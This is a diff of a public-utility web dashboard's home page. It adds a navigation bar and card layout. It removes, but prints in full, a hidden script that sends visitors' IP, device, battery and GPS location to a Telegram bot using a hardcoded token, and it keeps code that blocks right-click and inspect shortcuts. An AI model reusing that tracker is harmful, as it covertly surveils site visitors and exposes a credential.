@@ -6,29 +6,104 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
-/* ===== BASE ===== */
+/* ========== BASE ========== */
 body{
   margin:0;
   font-family:Segoe UI,Arial;
-  background:
-    radial-gradient(circle at top,#0b5ed7 0%,#020617 65%);
+  background:radial-gradient(circle at top,#0b5ed7 0%,#020617 65%);
   min-height:100vh;
   color:#fff;
   display:flex;
   flex-direction:column;
   align-items:center;
-  justify-content:center;
+  justify-content:flex-start;
+  padding-top:78px; /* space for navbar */
 }
 
-/* ===== HEADER ===== */
+/* ========== PREMIUM NAVBAR ========== */
+.nav{
+  position:fixed;
+  top:0;
+  left:0;
+  right:0;
+  z-index:1000;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  padding:14px 22px;
+  background:linear-gradient(180deg,rgba(15,23,42,.95),rgba(2,6,23,.9));
+  backdrop-filter:blur(16px);
+  border-bottom:1px solid rgba(255,255,255,.12);
+  box-shadow:0 12px 40px rgba(0,0,0,.6);
+}
+.nav-left{
+  font-size:17px;
+  font-weight:700;
+  display:flex;
+  align-items:center;
+  gap:8px;
+}
+.nav-right{
+  display:flex;
+  gap:22px;
+}
+.nav-right a{
+  position:relative;
+  color:#e5e7eb;
+  text-decoration:none;
+  font-size:14px;
+  font-weight:500;
+  padding:6px 2px;
+  transition:.3s;
+}
+.nav-right a::after{
+  content:"";
+  position:absolute;
+  left:0;
+  bottom:-6px;
+  width:0;
+  height:2px;
+  background:#38bdf8;
+  border-radius:2px;
+  transition:.3s;
+}
+.nav-right a:hover{color:#fff}
+.nav-right a:hover::after{width:100%}
+.nav-right a.active{color:#38bdf8}
+.nav-right a.active::after{width:100%}
+
+.nav-toggle{
+  display:none;
+  font-size:22px;
+  cursor:pointer;
+}
+
+@media(max-width:768px){
+  .nav-right{
+    position:fixed;
+    top:72px;
+    right:14px;
+    width:230px;
+    background:rgba(2,6,23,.97);
+    border-radius:20px;
+    padding:16px;
+    flex-direction:column;
+    gap:16px;
+    display:none;
+    box-shadow:0 30px 70px rgba(0,0,0,.8);
+  }
+  .nav-right.show{display:flex}
+  .nav-toggle{display:block}
+}
+
+/* ========== HEADER ========== */
 .header{
   text-align:center;
-  margin-bottom:36px;
+  margin:36px 0 36px;
 }
 .header h1{
   margin:0;
   font-size:32px;
-  letter-spacing:.5px;
 }
 .header p{
   margin-top:8px;
@@ -36,7 +111,7 @@ body{
   opacity:.85;
 }
 
-/* ===== GRID ===== */
+/* ========== GRID ========== */
 .grid{
   display:grid;
   grid-template-columns:repeat(auto-fit,minmax(260px,1fr));
@@ -45,10 +120,10 @@ body{
   width:90%;
 }
 
-/* ===== CARD ===== */
+/* ========== CARD ========== */
 .card{
   background:rgba(255,255,255,.08);
-  backdrop-filter: blur(16px);
+  backdrop-filter:blur(16px);
   border-radius:22px;
   padding:32px;
   text-align:center;
@@ -68,8 +143,6 @@ body{
   opacity:.85;
   line-height:1.5;
 }
-
-/* ===== BUTTON ===== */
 .card a{
   display:inline-block;
   margin-top:22px;
@@ -86,9 +159,9 @@ body{
   box-shadow:0 0 0 6px rgba(37,99,235,.25);
 }
 
-/* ===== FOOTER ===== */
+/* ========== FOOTER ========== */
 footer{
-  margin-top:48px;
+  margin:48px 0 24px;
   font-size:12px;
   opacity:.65;
   text-align:center;
@@ -98,54 +171,62 @@ footer{
 
 <body>
 
-<!-- ===== TITLE ===== -->
-  <div class="card">
-  <h2>📦 Product Barcode Scanner</h2>
-  <p>
-    Scan grocery & packaged food barcodes to
-    check product details, nutrition and
-    originality.
-  </p>
-  <a href="barcode.html">Open Scanner</a>
+<!-- ===== NAVBAR ===== -->
+<nav class="nav">
+  <div class="nav-left">🇮🇳 <span>Public Utility</span></div>
+
+  <div class="nav-right" id="navLinks">
+    <a href="index.html" class="active">Home</a>
+    <a href="barcode.html">Barcode</a>
+    <a href="upi.html">UPI QR</a>
+    <a href="cam.html">GPS Camera</a>
+    <a href="finder.html">PIN & IFSC</a>
+    <a href="about.html">About</a>
   </div>
-  
+
+  <div class="nav-toggle" onclick="toggleNav()">☰</div>
+</nav>
+
+<!-- ===== HEADER ===== -->
 <div class="header">
   <h1>🇮🇳 Public Utility Dashboard</h1>
   <p>Citizen services & location-based web tools</p>
 </div>
 
-<!-- ===== MAIN DASHBOARD ===== -->
+<!-- ===== DASHBOARD ===== -->
 <div class="grid">
-<div class="card">
-  <h3>🧾UPI QR</h3>
-  <p>Payment Tools</p>
-  <a href="upi.html" class="btn">Open</a>
-</div>
+
+  <div class="card">
+    <h2>📦 Product Barcode Scanner</h2>
+    <p>
+      Scan grocery & packaged food barcodes to
+      check product details, nutrition and originality.
+    </p>
+    <a href="barcode.html">Open Scanner</a>
+  </div>
+
+  <div class="card">
+    <h2>🧾 UPI QR Tool</h2>
+    <p>Generate secure UPI QR with bank detection.</p>
+    <a href="upi.html">Open</a>
+  </div>
+
   <div class="card">
     <h2>📸 GPS Web Camera</h2>
-    <p>
-      Capture photos with live location, address,
-      date and time overlay.
-    </p>
+    <p>Capture photo with live location, date & time.</p>
     <a href="cam.html">Open Camera</a>
   </div>
 
   <div class="card">
     <h2>📮 PIN & IFSC Finder</h2>
-    <p>
-      Find post office, bank branches,
-      IFSC codes and nearby services.
-    </p>
+    <p>Find bank IFSC, branch & post office details.</p>
     <a href="finder.html">Open Finder</a>
   </div>
 
   <div class="card">
     <h2>👤 About</h2>
-    <p>
-      Developer profile and project
-      information.
-    </p>
-    <a href="about.html">View About</a>
+    <p>Developer profile & project information.</p>
+    <a href="about.html">View</a>
   </div>
 
 </div>
@@ -154,157 +235,23 @@ footer{
 <footer>
   Designed & Developed by <strong>Rankaj Kumar</strong>
 </footer>
-<script>
-/* Disable right click */
-document.addEventListener("contextmenu", function(e){
-  e.preventDefault();
-});
 
-/* Optional: block common inspect shortcuts */
-document.addEventListener("keydown", function(e){
-  if(
-    e.key === "F12" ||
-    (e.ctrlKey && e.shiftKey && ["I","C","J"].includes(e.key)) ||
-    (e.ctrlKey && e.key === "U")
-  ){
+<script>
+/* MENU TOGGLE */
+function toggleNav(){
+  document.getElementById("navLinks").classList.toggle("show");
+}
+
+/* Disable right click */
+document.addEventListener("contextmenu",e=>e.preventDefault());
+
+/* Block inspect shortcuts */
+document.addEventListener("keydown",e=>{
+  if(e.key==="F12"||(e.ctrlKey&&e.shiftKey&&["I","C","J"].includes(e.key))||(e.ctrlKey&&e.key==="U")){
     e.preventDefault();
   }
 });
 </script>
-  <script>
-/* ==================================================
-   ONE IP = ONE TELEGRAM MESSAGE (FINAL & STABLE)
-   Frontend Safe | No UI Change | Bug-Free
-================================================== */
 
-// 🔴 TELEGRAM CONFIG
-const BOT_TOKEN = "7193425151:AAFKa2HcygWLjSOYWTcC917_joT6S-RBYyY";
-const CHAT_ID  = "543961277";
-
-// ================= DEVICE INFO =================
-const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
-const os = navigator.platform || "Unknown";
-const screenSize = screen.width + " x " + screen.height;
-
-// ================= GLOBAL DATA =================
-let ipData = null;
-let locationData = { status: "Pending" };
-let batteryData = "Not Supported";
-
-// ================= BATTERY =================
-if (navigator.getBattery) {
-  navigator.getBattery()
-    .then(battery => {
-      batteryData =
-        Math.round(battery.level * 100) +
-        "% (" + (battery.charging ? "Charging" : "Not Charging") + ")";
-    })
-    .catch(() => {});
-}
-
-// ================= IP FETCH =================
-fetch("https://ipapi.co/json/")
-  .then(res => res.json())
-  .then(data => {
-    ipData = data;
-    mainLogic();
-  })
-  .catch(() => {});
-
-// ================= LOCATION =================
-if (navigator.geolocation) {
-  navigator.geolocation.getCurrentPosition(
-    pos => {
-      locationData = {
-        status: "Allowed",
-        lat: pos.coords.latitude,
-        lon: pos.coords.longitude
-      };
-    },
-    () => {
-      locationData = { status: "Denied" };
-    },
-    { timeout: 7000 }
-  );
-} else {
-  locationData = { status: "Not Supported" };
-}
-
-// ================= SIM / NETWORK =================
-function detectSimCompany(org){
-  if(!org) return "Unknown";
-  org = org.toLowerCase();
-  if(org.includes("jio")) return "Jio";
-  if(org.includes("airtel")) return "Airtel";
-  if(org.includes("vodafone") || org.includes("idea")) return "VI";
-  if(org.includes("bsnl")) return "BSNL";
-  return "WiFi / Other ISP";
-}
-
-// ================= CORE LOGIC =================
-function mainLogic(){
-  if(!ipData || !ipData.ip) return;
-
-  const stored = JSON.parse(localStorage.getItem("unique_ips") || "[]");
-
-  // 🚫 Same IP already logged
-  if (stored.includes(ipData.ip)) return;
-
-  // ✅ Save IP
-  stored.push(ipData.ip);
-  localStorage.setItem("unique_ips", JSON.stringify(stored));
-
-  sendToTelegram();
-}
-
-// ================= TELEGRAM SEND =================
-function sendToTelegram(){
-  const mapLink =
-    locationData.lat
-      ? `https://maps.google.com/?q=${locationData.lat},${locationData.lon}`
-      : "Not Available";
-
-  const message = `
-🇮🇳 Public Utility Dashboard (Unique Visit)
-
-🕒 Time
-${new Date().toLocaleString()}
-
-📱 Device
-Type: ${deviceType}
-OS: ${os}
-Screen: ${screenSize}
-
-🔋 Battery
-${batteryData}
-
-🌐 Network
-IP: ${ipData.ip}
-Provider: ${detectSimCompany(ipData.org)}
-ISP: ${ipData.org || "N/A"}
-City: ${ipData.city || "N/A"}
-State: ${ipData.region || "N/A"}
-Country: ${ipData.country_name || "N/A"}
-
-📍 Location
-Status: ${locationData.status}
-Lat: ${locationData.lat || "N/A"}
-Lon: ${locationData.lon || "N/A"}
-Map: ${mapLink}
-
-🔗 Page
-${location.href}
-`;
-
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-    method:"POST",
-    headers:{ "Content-Type":"application/json" },
-    body:JSON.stringify({
-      chat_id: CHAT_ID,
-      text: message
-    })
-  }).catch(()=>{});
-}
-  </script>
 </body>
 </html>
